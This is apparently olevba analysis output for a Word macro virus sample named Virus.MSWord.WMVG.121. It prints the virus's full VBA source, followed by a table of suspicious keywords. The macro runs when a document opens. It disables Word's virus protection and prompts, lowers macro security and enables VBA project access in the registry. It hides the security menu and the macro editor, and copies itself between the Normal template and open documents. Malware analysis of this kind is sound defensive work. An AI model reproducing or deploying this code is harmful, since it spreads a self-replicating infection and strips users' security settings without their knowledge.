olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.WMVG.121
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.WMVG.121 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO test.bas 
in file: Virus.MSWord.WMVG.121 - OLE stream: 'Macros/VBA/test'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Virus Name : test
' Virus Author : aa
' Virus version : 1

' A Virus Created By The WalruS Virus Engine (WVE)

Sub AutoOpen()
    Call VEG9582
End Sub
Sub VEG9582()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End Select
WordBasic.DisableAutoMacros 0
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
Set LSU6786 = NormalTemplate.VBProject.VBComponents
Set OPN680 = ActiveDocument.VBProject.VBComponents
MTI8427 = "C:\test.UUU"
If LSU6786.Item("test").CodeModule.CountOfLines < 5 Then
    OPN680("test").Export MTI8427
    LSU6786.Import MTI8427
End If
If OPN680.Item("test").CodeModule.CountOfLines < 5 Then
    LSU6786("test").Export MTI8427
    OPN680.Import MTI8427
    ActiveDocument.Save
End If
Kill MTI8427
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub
' Another Virus Created By The WalruS Virus Generator (WVE) Version 1.21
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

